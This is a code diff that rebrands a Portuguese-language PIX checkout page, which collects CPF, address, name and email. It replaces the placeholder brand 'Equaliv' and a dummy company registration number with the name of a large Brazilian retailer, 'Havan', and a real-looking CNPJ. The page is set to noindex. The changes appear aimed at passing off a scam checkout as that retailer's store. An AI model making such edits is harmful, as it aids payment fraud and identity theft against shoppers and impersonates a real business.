@@ -4,7 +4,7 @@
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
 <meta name="robots" content="noindex, nofollow">
-<title>Finalizar compra | Equaliv</title>
+<title>Finalizar compra</title>
 <link rel="preconnect" href="https://fonts.googleapis.com">
 <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
 <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800&display=swap" rel="stylesheet">
@@ -345,7 +345,7 @@ body{background:linear-gradient(180deg,#f3f7fa 0,#f8fafc 300px);padding-bottom:2
 
   <!-- HEADER -->
   <div class="top">
-    <div class="brand"><div class="mark" aria-hidden="true">EQ</div><div class="logo">Equaliv</div></div>
+    <div class="brand"><div class="mark" aria-hidden="true">EQ</div><div class="logo">Havan</div></div>
     <div class="h" id="headerStep">Etapa 1 de 3</div>
   </div>
 
@@ -564,7 +564,7 @@ body{background:linear-gradient(180deg,#f3f7fa 0,#f8fafc 300px);padding-bottom:2
        descumprimento do Código de Defesa do Consumidor (identificação do
        fornecedor). -->
   <div class="foot">
-    EQUALIV COMÉRCIO LTDA · CNPJ 00.000.000/0001-00<br>
+    HAVAN COMÉRCIO LTDA · CNPJ 45.982.198/0001-39<br>
     Precisa de ajuda? <a href="https://wa.me/5500000000000" target="_blank" rel="noopener">Fale no WhatsApp</a> ·
     <a href="/privacidade" target="_blank" rel="noopener">Privacidade</a> ·
     <a href="/termos" target="_blank" rel="noopener">Termos</a>
@@ -1065,7 +1065,7 @@ async function gerarPix() {
       await new Promise(r => setTimeout(r, 900));
       pix = {
         qr_image: gerarQrFake(),
-        copia_e_cola: '00020126BR.GOV.BCB.PIX' + Date.now() + '5204000053039865802BR5913EQUALIV6009SAOPAULO62070503***6304DEMO',
+        copia_e_cola: '00020126BR.GOV.BCB.PIX' + Date.now() + '5204000053039865802BR5913HAVAN6009SAOPAULO62070503***6304DEMO',
         id: 'demo-' + Date.now()
       };
     } else {
@@ -1319,7 +1319,7 @@ function aprovado() {
 /* =====================================================================
    PERSISTÊNCIA LOCAL — retoma o checkout e evita PIX duplicado no mesmo navegador
    ===================================================================== */
-const CHECKOUT_STATE_PREFIX = 'equaliv_checkout_state_v4_';
+const CHECKOUT_STATE_PREFIX = 'checkout_checkout_state_v4_';
 const STATE_FIELDS = ['cep', 'estado', 'cidade', 'bairro', 'rua', 'numero', 'compl', 'nome', 'email', 'cpf'];
 function stateHash(value) {
   let h = 2166136261;
